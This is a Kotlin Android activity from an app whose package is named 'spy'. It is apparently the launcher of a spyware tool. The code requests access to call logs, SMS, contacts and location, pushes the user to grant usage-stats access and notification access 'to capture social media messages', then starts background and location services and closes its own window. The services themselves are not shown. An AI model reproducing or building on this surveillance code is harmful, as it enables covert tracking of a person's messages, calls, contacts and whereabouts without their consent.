package com.gauravhanna.spy

import android.Manifest
import android.app.AppOpsManager
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val requiredPermissions = listOf(
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )
    private val requestCode = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (hasPermissions()) {
            checkSpecialPermissions()
        } else {
            ActivityCompat.requestPermissions(this, requiredPermissions.toTypedArray(), requestCode)
        }
    }

    private fun hasPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == this.requestCode) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                checkSpecialPermissions()
            } else {
                showPermissionExplanationDialog()
            }
        }
    }

    private fun startServices() {
        val backgroundIntent = Intent(this, BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(backgroundIntent)
        } else {
            startService(backgroundIntent)
        }

        val locationIntent = Intent(this, LocationService::class.java)
        startService(locationIntent)

        finish()
    }

    private fun checkSpecialPermissions() {
        var allSpecialGranted = true

        // Usage Stats
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val appOps = getSystemService(AppOpsManager::class.java)
            val usageAccess = appOps.unsafeCheckOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                packageName
            ) == AppOpsManager.MODE_ALLOWED
            if (!usageAccess) {
                allSpecialGranted = false
                showSpecialPermissionDialog(
                    "Usage Access Required",
                    "Please enable Usage Access to track app usage.",
                    Settings.ACTION_USAGE_ACCESS_SETTINGS
                )
            }
        }

        // Notification Access
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            val notificationAccess = try {
                val enabledListeners = Settings.Secure.getString(
                    contentResolver,
                    "enabled_notification_listeners"
                )
                enabledListeners?.contains(packageName) == true
            } catch (e: Exception) { false }
            if (!notificationAccess) {
                allSpecialGranted = false
                showSpecialPermissionDialog(
                    "Notification Access Required",
                    "Please enable Notification Access to capture social media messages.",
                    Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
                )
            }
        }

        if (allSpecialGranted) {
            startServices()
        }
    }

    private fun showSpecialPermissionDialog(title: String, message: String, settingsAction: String) {
        AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(Intent(settingsAction))
            }
            .setNegativeButton("Skip (limited functionality)") { _, _ ->
                startServices()
            }
            .setCancelable(false)
            .show()
    }

    private fun showPermissionExplanationDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This app needs call logs, SMS, contacts and location permissions to work properly.")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            .setNegativeButton("Exit") { _, _ ->
                finishAffinity()
            }
            .setCancelable(false)
            .show()
    }
}